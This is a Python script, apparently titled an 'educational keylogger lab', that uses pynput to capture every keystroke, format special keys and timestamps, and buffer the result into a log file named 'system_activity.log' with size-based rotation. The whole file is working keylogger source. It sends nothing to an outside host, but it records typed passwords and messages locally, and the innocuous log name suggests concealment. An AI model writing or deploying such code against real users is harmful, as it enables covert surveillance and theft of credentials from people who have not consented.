
import os
import time
from pynput import keyboard

# Configuration Constants
LOG_FILE = "system_activity.log"
MAX_FILE_SIZE_BYTES = 1024 * 1024  # 1 MB limit before rotation
BUFFER_FLUSH_COUNT = 10            # Write to disk after every 10 keystrokes

# Internal State Variables
key_buffer = []

def rotate_log_if_needed():
    """Checks the log file size and rotates it if it exceeds the maximum limit."""
    if os.path.exists(LOG_FILE):
        if os.path.getsize(LOG_FILE) > MAX_FILE_SIZE_BYTES:
            backup_name = f"system_activity_backup_{int(time.time())}.log"
            os.rename(LOG_FILE, backup_name)

def flush_buffer():
    """Flushes the accumulated keystrokes from memory to the physical log file."""
    if not key_buffer:
        return
    
    rotate_log_if_needed()
    
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("".join(key_buffer))
        key_buffer.clear()
    except Exception as e:
        print(f"[!] Error writing to log file: {e}")

def format_key_output(key):
    """Formats standard and special keys into readable representations with timestamps."""
    timestamp = time.strftime("[%Y-%m-%d %H:%M:%S] ")
    
    try:
        # Standard alphanumeric characters
        return key.char
    except AttributeError:
        # Handle special keyboard keys safely
        if key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n" + timestamp
        elif key == keyboard.Key.tab:
            return "\t"
        elif key == keyboard.Key.backspace:
            return " [BKSP] "
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            return ""  # Ignore shift modifier printing
        else:
            return f" [{key.name.upper()}] "

def on_press(key):
    """Event handler triggered whenever a key is pressed down."""
    global key_buffer
    
    formatted_key = format_key_output(key)
    if formatted_key:
        key_buffer.append(formatted_key)
    
    # Check if buffer threshold is reached to perform bulk write
    if len(key_buffer) >= BUFFER_FLUSH_COUNT:
        flush_buffer()

def on_release(key):
    """Event handler triggered when a key is released. Exits on ESC key."""
    if key == keyboard.Key.esc:
        # Flush any remaining items before exiting
        flush_buffer()
        print("\n[*] ESC pressed. Stopping listener...")
        return False

def initialize_logger():
    """Initializes the logging environment and writes session header."""
    timestamp_header = f"\n--- Session Started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(timestamp_header)

if __name__ == "__main__":
   
    print("      ADVANCED EDUCATIONAL KEYLOGGER LAB          ")
    
    print(f"[*] Target Log File: {os.path.abspath(LOG_FILE)}")
    print("[*] Status: Running... (Press 'ESC' to terminate)")
    
    initialize_logger()
    
    # Start the non-blocking or blocking keyboard listener context
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        flush_buffer()
        print("\n[*] Interrupted by user via terminal. Exiting safely.")
